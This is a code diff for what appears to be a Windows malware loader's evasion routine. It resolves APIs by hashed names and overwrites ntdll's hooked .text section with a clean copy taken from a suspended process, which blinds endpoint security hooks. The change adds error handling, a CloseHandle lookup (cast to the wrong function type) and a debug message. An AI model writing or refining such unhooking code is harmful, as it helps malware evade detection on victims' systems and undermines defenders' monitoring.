@@ -14,9 +14,11 @@ BOOL evasion_unhook_ntdll_process_load_apis(void) {
         g_ldr->apis->ReadProcessMemory = (pReadProcessMemory)GetProc(g_ldr->apis->modules.kernel32, HASHED_READPROCESSMEMORY);
     if (!g_ldr->apis->TerminateProcess)
         g_ldr->apis->TerminateProcess = (pTerminateProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_TERMINATEPROCESS);
+    if (!g_ldr->apis->CloseHandle)
+        g_ldr->apis->CloseHandle = (pTerminateProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
 
     return (g_ldr->apis->CreateProcessA && g_ldr->apis->VirtualProtect &&
-        g_ldr->apis->ReadProcessMemory && g_ldr->apis->TerminateProcess);
+        g_ldr->apis->ReadProcessMemory && g_ldr->apis->TerminateProcess && g_ldr->apis->CloseHandle);
 }
 
 BOOL is_ntdll_hooked() {
@@ -60,19 +62,21 @@ BOOL evasion_unhook_ntdll_process(void) {
             BOOL check = g_ldr->apis->VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &old);
             if (!check) {
                 DBGA("VirtualProtect 1 failed: %lu\n", GetLastError());
+                return FALSE;
             }
             memcpy(textAddr, clean, textSize);
             check = g_ldr->apis->VirtualProtect(textAddr, textSize, old, &old);
             if (!check) {
                 DBGA("VirtualProtect 2 failed: %lu\n", GetLastError());
+                return FALSE;
             }
+            DBGA("[*] Unhooked ntdll via suspened process\n");
 
             g_ldr->apis->LocalFree(clean);
             break;
         }
     }
-
-    PAUSE("Notepad");
+    
     
     g_ldr->apis->TerminateProcess(pi.hProcess, 0);
     g_ldr->apis->CloseHandle(pi.hProcess);
